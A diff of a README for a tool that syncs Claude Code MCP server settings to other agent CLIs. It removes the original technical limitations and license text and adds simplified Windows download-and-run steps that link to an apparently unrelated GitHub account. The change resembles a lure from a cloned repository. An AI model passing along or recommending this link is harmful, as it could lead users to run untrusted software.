-# Validate plugin/marketplace structure
-claude plugin validate /path/to/sync-agents-settings
-```
-
-## Limitations
-
-- **OAuth servers** (e.g. Slack with `oauth.clientId`) are synced as URL-only — you'll need to authenticate manually in each CLI
-- **`${CLAUDE_PLUGIN_ROOT}`** env vars won't resolve in other CLIs
-- Codex CLI doesn't support `${VAR:-default}` syntax in URLs — these are auto-expanded during sync (env value if set, otherwise the default)
-- Re-running sync will **not overwrite** existing entries (safe to run multiple times)
-- Codex CLI does NOT merge global and project configs — when `.codex/` exists in a project, global `~/.codex/` is ignored
-- If target config directories don't exist, sync will skip that target (won't create directories)
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=Leoyang183/sync-agents-settings&type=Date)](https://star-history.com/#Leoyang183/sync-agents-settings&Date)
-
-## License
-
-MIT
+1. It reads the MCP server config from Claude Code.
+2. It maps that config to the other agent tools.
+3. It writes the matching settings in the right place.
+4. It helps keep your agent setup consistent across apps.
+
+## 📌 Good habits
+
+To keep your setup stable:
+
+- Keep one main source config in Claude Code
+- Sync after you make a change
+- Back up your config files if you make custom edits
+- Close apps before changing their settings
+- Use the same Windows account each time
+
+## 🔗 Download again
+
+[Visit the download page](https://github.com/Boykiniaelaeisguineensis941/sync-agents-settings)
+
+## 🧾 Repository details
+
+- Repository: sync-agents-settings
+- Topic area: ai agents and MCP server sync
+- Main use: move Claude Code settings to other agent tools
+- Platform: Windows
+- Source: GitHub
+
+## 🖥️ Example workflow
+
+1. Install Claude Code.
+2. Add your MCP servers there.
+3. Download sync-agents-settings from the link above.
+4. Run it on Windows.
+5. Sync the settings to Gemini CLI, Codex CLI, OpenCode, Kiro, and Cursor.
+6. Open each tool and confirm the same servers appear
